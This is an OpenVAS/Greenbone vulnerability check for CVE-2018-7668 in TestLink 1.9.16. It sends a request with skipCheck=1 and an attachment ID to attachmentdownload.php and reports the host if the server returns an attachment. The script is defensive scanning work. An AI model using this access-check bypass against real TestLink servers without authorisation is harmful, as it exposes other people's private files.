###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_testlink_inf_disc_vuln.nasl 12116 2018-10-26 10:01:35Z mmartin $
#
# TestLink 1.9.16 Information Disclosure Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113125");
  script_version("$Revision: 12116 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 12:01:35 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-03-07 14:30:00 +0100 (Wed, 07 Mar 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-7668");

  script_name("TestLink 1.9.16 Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("testlink_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("testlink/installed");

  script_tag(name:"summary", value:"TestLink is prone to an Information vulnerability.");
  script_tag(name:"vuldetect", value:"The script tries to exploit the vulnerability and reports the vulnerability in case of success.");
  script_tag(name:"insight", value:"TestLink allows remote attackers to read arbitrary attachments via a modified ID field to /lib/attachments/attachmentdownload.php.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to access arbitrary attachment files.");
  script_tag(name:"affected", value:"TestLink versions through 1.9.16.");
  script_tag(name:"solution", value:"Update to version 1.9.17.");

  script_xref(name:"URL", value:"http://lists.openwall.net/full-disclosure/2018/02/28/1");

  exit(0);
}

CPE = "cpe:/a:teamst:testlink";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );

if( location == "/" )
  location = "";

vuln_url = location + "/lib/attachments/attachmentdownload.php?skipCheck=1&id=1";
buf = http_get_cache( port: port, item: vuln_url );

exploit_pattern_body = "Downloading attachment</h1>";
exploit_pattern_header_1 = 'Content-Disposition: inline; filename="';
exploit_pattern_header_2 = 'Content-Description: Download Data';

if( egrep( string: buf, pattern: exploit_pattern_body, icase: TRUE ) || ( egrep( string: buf, pattern: exploit_pattern_header_1, icase: TRUE ) && egrep( string: buf, pattern: exploit_pattern_header_2, icase: TRUE ) ) ) {
  report = report_vuln_url(  port: port, url: vuln_url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
